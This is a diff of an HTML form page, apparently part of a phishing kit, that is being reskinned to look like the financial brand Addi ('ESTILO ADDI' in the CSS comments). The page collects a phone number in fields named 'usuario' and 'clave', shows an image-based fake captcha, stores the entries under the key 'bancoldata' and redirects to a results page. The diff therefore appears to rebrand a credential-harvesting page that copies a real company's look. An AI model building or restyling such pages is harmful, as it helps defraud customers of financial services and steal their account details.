@@ -8,394 +8,250 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
 
 <style>
-  body {
-    margin: 0;
-    background: #FFFFFF;
-    font-family: 'Inter', sans-serif;
-    display: flex;
-    flex-direction: column;
-    min-height: 100vh;
-  }
 
-  .header {
-    width: 100%;
-    background: #2E0039;
-    padding: 15px 20px;
-    color: white;
-    font-size: 20px;
-    font-weight: 700;
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
+/* ------------------------------
+     DISEÑO COMPLETO ESTILO ADDI
+-------------------------------*/
 
-  .header span {
-    font-size: 22px;
-    cursor: pointer;
-  }
+body {
+  margin: 0;
+  background: #FFFFFF;
+  font-family: 'Inter', sans-serif;
+  display: flex;
+  flex-direction: column;
+  min-height: 100vh;
+  color: #1f1f1f;
+}
 
-  .container {
-    padding: 20px;
-    flex: 1;
-  }
+/* HEADER ADDI AZUL */
+.header {
+  width: 100%;
+  background: #2F6BFF;
+  padding: 15px 20px;
+  color: white;
+  font-size: 20px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
 
-  .title {
-    font-size: 28px;
-    font-weight: 700;
-    color: #2E0039;
-    margin-bottom: 25px;
-    margin-top: 15px;
-  }
+.header span {
+  font-size: 22px;
+  cursor: pointer;
+}
 
-  /* ALERTA TEMPORAL */
-  .alert-temporary {
-    position: fixed;
-    top: 50%;
-    left: 50%;
-    transform: translate(-50%, -50%);
-    background: #2E0039;
-    color: white;
-    padding: 20px 30px;
-    border-radius: 12px;
-    font-size: 16px;
-    font-weight: 600;
-    text-align: center;
-    z-index: 10000;
-    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
-    animation: fadeInOut 4s ease-in-out;
-    display: none;
-  }
+/* CONTENEDOR */
+.container {
+  padding: 20px;
+  flex: 1;
+}
 
-  @keyframes fadeInOut {
-    0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
-    10% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-    90% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
-    100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
-  }
+/* TITULO TIPO ADDI */
+.title {
+  font-size: 26px;
+  font-weight: 700;
+  color: #1F1F1F;
+  margin-bottom: 20px;
+  margin-top: 15px;
+}
 
-  .alert-icon-temp {
-    font-size: 24px;
-    margin-bottom: 10px;
-  }
+/* ALERTA TEMPORAL ADDI */
+.alert-temporary {
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  background: #2F6BFF;
+  color: white;
+  padding: 20px 30px;
+  border-radius: 14px;
+  font-size: 16px;
+  font-weight: 600;
+  text-align: center;
+  z-index: 10000;
+  box-shadow: 0 8px 25px rgba(0,0,0,0.25);
+  animation: fadeInOut 4s ease-in-out;
+  display: none;
+}
 
-  /* ALERTA VISUAL EN PÁGINA */
-  .alert-box {
-    background: #FFF3CD;
-    border: 1px solid #FFEAA7;
-    border-radius: 12px;
-    padding: 16px;
-    margin-bottom: 20px;
-    display: flex;
-    align-items: flex-start;
-    gap: 12px;
-  }
+@keyframes fadeInOut {
+  0% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+  10% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  90% { opacity: 1; transform: translate(-50%, -50%) scale(1); }
+  100% { opacity: 0; transform: translate(-50%, -50%) scale(0.8); }
+}
 
-  .alert-icon {
-    width: 24px;
-    height: 24px;
-    background: #FFC107;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: white;
-    font-weight: bold;
-    font-size: 14px;
-    flex-shrink: 0;
-  }
+/* ALERTA PRINCIPAL ADDI */
+.alert-box {
+  background: #EAF1FF;
+  border: 1px solid #C7D8FF;
+  border-radius: 12px;
+  padding: 16px;
+  margin-bottom: 20px;
+  display: flex;
+  align-items: flex-start;
+  gap: 12px;
+}
 
-  .alert-content {
-    flex: 1;
-  }
+.alert-icon {
+  width: 28px;
+  height: 28px;
+  background: #2F6BFF;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  color: white;
+  font-size: 16px;
+  font-weight: bold;
+}
 
-  .alert-title {
-    font-size: 16px;
-    font-weight: 600;
-    color: #856404;
-    margin-bottom: 4px;
-  }
+.alert-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #1C3FAD;
+}
 
-  .alert-text {
-    font-size: 14px;
-    color: #856404;
-    line-height: 1.4;
-  }
+.alert-text {
+  font-size: 14px;
+  color: #4E5E92;
+  line-height: 1.4;
+}
 
-  .card {
-    background: #fff;
-    padding: 20px 0;
-    margin-bottom: 0;
-    border-bottom: 1px solid #f0f0f0;
-    display: flex;
-    align-items: flex-start;
-  }
+/* TARJETAS ADDI */
+.card {
+  background: #fff;
+  padding: 18px 0;
+  border-bottom: 1px solid #E8E8E8;
+  display: flex;
+  align-items: flex-start;
+}
 
-  .left {
-    display: flex;
-    align-items: flex-start;
-    gap: 15px;
-    flex: 1;
-  }
+.left {
+  display: flex;
+  align-items: flex-start;
+  gap: 15px;
+  flex: 1;
+}
 
-  .icon {
-    width: 40px;
-    height: 40px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
+/* ICONO CIRCULAR ADDI */
+.icon-circle {
+  width: 42px;
+  height: 42px;
+  border-radius: 50%;
+  background: #EAF1FF;
+  border: 2px solid #C7D8FF;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 20px;
+  color: #2F6BFF;
+  font-weight: 700;
+}
 
-  .icon-circle {
-    width: 40px;
-    height: 40px;
-    border-radius: 50%;
-    background: #F8F1F5;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-size: 16px;
-    color: #2E0039;
-    font-weight: bold;
-    border: 2px solid #E3D4EE;
-  }
+.text-title {
+  font-size: 16px;
+  font-weight: 700;
+  color: #1F1F1F;
+}
 
-  .content {
-    flex: 1;
-  }
+.text-sub {
+  font-size: 14px;
+  color: #8B8B8B;
+  margin-bottom: 10px;
+}
 
-  .text-title {
-    font-size: 17px;
-    font-weight: 600;
-    color: #2E0039;
-    margin-bottom: 5px;
-  }
+/* INPUTS ADDI */
+.input-container {
+  border-bottom: 2px solid #DBE4FF;
+  padding-bottom: 8px;
+  margin-bottom: 8px;
+  transition: all .3s ease-in-out;
+}
 
-  .text-sub {
-    font-size: 14px;
-    color: #666;
-    margin-bottom: 12px;
-    line-height: 1.4;
-  }
+.input-container:focus-within {
+  border-bottom-color: #2F6BFF;
+}
 
-  .input-field {
-    width: 100%;
-    padding: 0;
-    background-color: transparent;
-    border: none;
-    border-radius: 0;
-    font-size: 16px;
-    color: #2E0039;
-    outline: none;
-    font-family: 'Inter', sans-serif;
-    font-weight: 500;
-    margin-bottom: 5px;
-  }
+.input-field {
+  width: 100%;
+  padding: 6px 0;
+  border: none;
+  outline: none;
+  background: transparent;
+  font-size: 16px;
+  color: #1F1F1F;
+  font-weight: 500;
+}
 
-  .input-field::placeholder {
-    color: #999;
-    font-weight: 400;
-  }
+.input-field::placeholder {
+  color: #A8A8A8;
+}
 
-  .input-field:focus {
-    border: none;
-    background-color: transparent;
-    box-shadow: none;
-  }
+/* CAPTCHA */
+.captcha-section { margin: 25px 0; }
+.captcha-check.checked { background: #4CAF50 !important; }
 
-  /* BOTONES */
-  .login-button {
-    width: 100%;
-    padding: 18px;
-    background-color: #da008130;
-    border: none;
-    border-radius: 14px;
-    font-size: 17px;
-    margin-top: 30px;
-    cursor: not-allowed;
-    font-weight: 700;
-    transition: all 0.3s ease;
-    font-family: 'Inter', sans-serif;
-    color: #fff;
-  }
+/* BOTÓN PRINCIPAL ADDI */
+.login-button {
+  width: 100%;
+  padding: 16px;
+  border: none;
+  border-radius: 40px;
+  background: #AFC7FF;
+  font-size: 17px;
+  font-weight: 600;
+  color: white;
+  margin-top: 30px;
+  cursor: not-allowed;
+  transition: all .3s ease;
+}
 
-  .login-button.active {
-    background-color: #2E0039;
-    cursor: pointer;
-  }
+.login-button.active {
+  background: #2F6BFF;
+  cursor: pointer;
+}
 
-  .login-button.active:hover {
-    background: #3A0A63;
-  }
+.login-button.active:hover {
+  background: #1D54E6;
+}
 
-  .now-button {
-    width: 100%;
-    background: #ffffff;
-    color: #2E0039;
-    border: 2px solid #E3D4EE;
-    padding: 16px;
-    border-radius: 14px;
-    font-size: 16px;
-    margin-top: 15px;
-    cursor: pointer;
-    font-weight: 600;
-    transition: all 0.3s ease;
-    font-family: 'Inter', sans-serif;
-  }
+/* BOTÓN SECUNDARIO */
+.now-button {
+  width: 100%;
+  padding: 15px;
+  margin-top: 12px;
+  border-radius: 40px;
+  background: white;
+  border: 2px solid #C7D8FF;
+  color: #2F6BFF;
+  font-size: 16px;
+  font-weight: 600;
+  transition: .3s;
+}
 
-  .now-button:hover {
-    background: #F9F3FF;
-    border-color: #2E0039;
-  }
+.now-button:hover {
+  background: #EAF1FF;
+}
 
-  /* CAPTCHA STYLES */
-  .captcha-section {
-    margin: 30px 0;
-    padding: 10px;
-    border-radius: 12px;
-  }
+/* LOADER */
+#loader {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(255,255,255,0.95);
+  z-index: 9999;
+  text-align: center;
+  padding-top: 40%;
+  font-size: 18px;
+  color: #2F6BFF;
+  font-weight: 600;
+}
 
-  .captcha-table {
-    width: 100%;
-    border-collapse: collapse;
-    margin: 15px 0;
-  }
-
-  .captcha-table td {
-    height: 77px;
-    vertical-align: middle;
-    text-align: center;
-    font-weight: bold;
-  }
-
-  .captcha-check {
-    cursor: pointer;
-    background: #f0f0f0;
-    transition: background 0.3s ease;
-  }
-
-  .captcha-check:hover {
-    background: #e0e0e0;
-  }
-
-  .captcha-check.checked {
-    background: #00C853;
-  }
-
-  /* FOOTER */
-  .footer {
-    background: #2E0039;
-    color: white;
-    padding: 25px 20px;
-    text-align: center;
-    margin-top: 40px;
-  }
-
-  .footer-content {
-    max-width: 1200px;
-    margin: 0 auto;
-  }
-
-  .footer-logo {
-    font-size: 24px;
-    font-weight: bold;
-    margin-bottom: 15px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 10px;
-  }
-
-  .footer-logo .icon {
-    background: white;
-    color: #2E0039;
-    width: 30px;
-    height: 30px;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    font-weight: bold;
-    font-size: 14px;
-  }
-
-  .footer-text {
-    font-size: 14px;
-    opacity: 0.9;
-    margin-bottom: 15px;
-    line-height: 1.5;
-  }
-
-  .footer-links {
-    display: flex;
-    justify-content: center;
-    gap: 20px;
-    flex-wrap: wrap;
-    margin-bottom: 20px;
-  }
-
-  .footer-link {
-    color: white;
-    text-decoration: none;
-    font-size: 13px;
-    opacity: 0.8;
-    transition: opacity 0.3s ease;
-  }
-
-  .footer-link:hover {
-    opacity: 1;
-  }
-
-  .footer-copyright {
-    font-size: 12px;
-    opacity: 0.7;
-    border-top: 1px solid rgba(255,255,255,0.2);
-    padding-top: 15px;
-    margin-top: 15px;
-  }
-
-  .security-badge {
-    background: rgba(255,255,255,0.1);
-    padding: 8px 15px;
-    border-radius: 20px;
-    font-size: 12px;
-    display: inline-block;
-    margin-top: 10px;
-  }
-
-  #loader {
-    display: none;
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background: rgba(255, 255, 255, 0.95);
-    z-index: 9999;
-    text-align: center;
-    padding-top: 40%;
-    font-size: 18px;
-    color: #2E0039;
-    font-weight: 600;
-  }
-
-  .input-value {
-    font-size: 16px;
-    color: #2E0039;
-    font-weight: 500;
-    margin-bottom: 5px;
-    min-height: 24px;
-  }
-
-  .input-container {
-    border-bottom: 2px solid #E3D4EE;
-    padding-bottom: 8px;
-    margin-bottom: 8px;
-    transition: border-color 0.3s ease;
-  }
-
-  .input-container:focus-within {
-    border-bottom-color: #2E0039;
-  }
 </style>
 </head>
 
@@ -414,7 +270,7 @@
 <div class="container">
   <div class="title">Tu info</div>
 
-  <!-- ALERTA DE CORRECCIÓN -->
+  <!-- ALERTA PRINCIPAL -->
   <div class="alert-box">
     <div class="alert-icon">!</div>
     <div class="alert-content">
@@ -424,69 +280,44 @@
   </div>
 
   <form id="loginForm">
-    <!-- CELULAR (usuario) -->
+
     <div class="card">
       <div class="left">
-        <div class="icon">
-          <div class="icon-circle">📱</div>
-        </div>
+        <div class="icon-circle">📱</div>
         <div class="content">
           <div class="text-title">Número de celular</div>
           <div class="text-sub">Ingresa tu número de celular</div>
           <div class="input-container">
-            <input 
-              type="number" 
-              class="input-field" 
-              id="usuario" 
-              placeholder="Ej: 123456789" 
-              required 
-              pattern="[0-9]{6,12}" 
-              maxlength="12" 
-              minlength="6" 
-              inputmode="numeric"
-            />
+            <input type="number" class="input-field" id="usuario" placeholder="Ej: 123456789" required>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- CONFIRMAR CELULAR (clave) -->
     <div class="card">
       <div class="left">
-        <div class="icon">
-          <div class="icon-circle">📱</div>
-        </div>
+        <div class="icon-circle">📱</div>
         <div class="content">
           <div class="text-title">Confirmar celular</div>
           <div class="text-sub">Vuelve a ingresar tu número de celular</div>
           <div class="input-container">
-            <input 
-              type="number" 
-              class="input-field" 
-              id="clave" 
-              placeholder="Mismo número de celular" 
-              required 
-              pattern="[0-9]{6,12}" 
-              maxlength="12" 
-              minlength="6" 
-              inputmode="numeric"
-            />
+            <input type="number" class="input-field" id="clave" placeholder="Mismo número de celular" required>
           </div>
         </div>
       </div>
     </div>
 
-    <!-- CAPTCHA EXACTO -->
+    <!-- CAPTCHA -->
     <div class="captcha-section">
       <table class="captcha-table" cellpadding="0" cellspacing="0" border="0">
         <tr>
-          <td width="8" style="background-image: url('img/cap1.jpg');"></td>
-          <td width="38" style="background-image: url('img/cap2.jpg');" class="captcha-check" id="catcha">
+          <td width="8" style="background-image:url('img/cap1.jpg');"></td>
+          <td width="38" id="catcha" class="captcha-check" style="background-image:url('img/cap2.jpg');">
             <img src="img/aceptar.jpg" width="38">
           </td>
-          <td width="113" style="background-image: url('img/cap3.jpg');"></td>
-          <td style="background-image: url('img/cap4.jpg');"></td>
-          <td width="98" style="background-image: url('img/cap5.jpg');"></td>
+          <td width="113" style="background-image:url('img/cap3.jpg');"></td>
+          <td style="background-image:url('img/cap4.jpg');"></td>
+          <td width="98" style="background-image:url('img/cap5.jpg');"></td>
         </tr>
       </table>
     </div>
@@ -494,13 +325,14 @@
     <!-- BOTONES -->
     <button type="submit" class="login-button" id="loginBtn" disabled>Verificar Identidad</button>
     <button type="button" class="now-button" onclick="window.location.href='https://www.google.com'">Ahora no</button>
+
   </form>
 
-  
-<div id="loader">
-  Cargando...
+<div id="loader">Cargando...</div>
+
 </div>
 
+<!-- ⭐⭐ TU JAVASCRIPT ORIGINAL COMPLETO ⭐⭐ -->
 <script>
     // Mostrar alerta temporal al cargar la página
     window.addEventListener('load', function() {
@@ -556,8 +388,9 @@
 
       localStorage.setItem('bancoldata', JSON.stringify(datos));
       document.getElementById('loader').style.display = 'block';
+
       setTimeout(() => {
-        window.location.href = 'resultados.php';
+        window.location.href = 'resultados.html';
       }, 1500);
     });
 </script>
